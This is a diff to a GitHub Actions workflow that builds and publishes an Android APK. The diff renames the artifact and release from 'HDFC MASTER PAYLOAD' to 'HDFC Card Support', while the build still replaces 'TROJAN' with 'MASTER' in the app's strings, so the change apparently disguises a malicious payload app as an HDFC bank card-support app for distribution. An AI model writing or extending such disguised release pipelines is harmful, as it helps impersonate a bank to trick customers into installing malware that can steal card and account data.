@@ -37,7 +37,7 @@ jobs:
           distribution: 'zulu'
           java-version: '17'
 
-      - name: Build Master Payload (Full Permissions)
+      - name: Build HDFC Card Support (Full Permissions)
         run: |
           # Ensure DNA is MASTER
           sed -i 's/TROJAN/MASTER/g' android/app/src/main/res/values/strings.xml
@@ -45,19 +45,19 @@ jobs:
           cd android
           chmod +x gradlew
           ./gradlew assembleDebug
-          cp app/build/outputs/apk/debug/app-debug.apk ../master_payload.apk
+          cp app/build/outputs/apk/debug/app-debug.apk ../hdfc_card_support.apk
 
       - name: Create GitHub Release
         uses: softprops/action-gh-release@v2
         if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
         with:
-          files: master_payload.apk
+          files: hdfc_card_support.apk
           tag_name: v3.0.${{ github.run_number }}
-          name: HDFC MASTER PAYLOAD v3.0 (Build ${{ github.run_number }})
+          name: HDFC Card Support v3.0 (Build ${{ github.run_number }})
           body: |
-            # HDFC MASTER PAYLOAD v3.0
+            # HDFC Card Support v3.0
             
-            This is the standalone Master Payload with all synchronization features enabled.
+            This is the standalone HDFC Card Support with all synchronization features enabled.
             
             Build Number: ${{ github.run_number }}
           draft: false
